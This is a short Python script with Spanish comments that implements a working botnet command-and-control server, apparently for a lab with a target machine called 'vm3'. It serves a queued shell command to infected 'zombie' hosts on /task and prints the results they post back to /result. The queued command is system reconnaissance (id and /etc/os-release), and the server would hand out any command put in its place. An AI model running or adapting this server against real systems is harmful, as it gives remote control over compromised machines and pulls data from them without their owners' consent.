#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

# Este es el comando que el C2 ordenará ejecutar a la vm3
COMMAND_TO_EXECUTE = "id && cat /etc/os-release | grep PRETTY_NAME"

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Cuando el zombie pregunta por tareas
        if self.path == '/task':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(COMMAND_TO_EXECUTE.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        # Cuando el zombie devuelve el resultado del comando
        if self.path == '/result':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            print("\n[+] 💀 Resultado recibido del botnet:")
            print("-" * 40)
            print(post_data.decode('utf-8'))
            print("-" * 40)
            self.send_response(200)
            self.end_headers()

    # Silenciar los logs por defecto de HTTP para que se vea más limpio
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    puerto = 8080
    server = HTTPServer(('0.0.0.0', puerto), C2Handler)
    print(f"[*] Servidor Command & Control escuchando en http://0.0.0.0:{puerto}")
    print(f"[*] Comando encolado para los bots: '{COMMAND_TO_EXECUTE}'\n")
    server.serve_forever()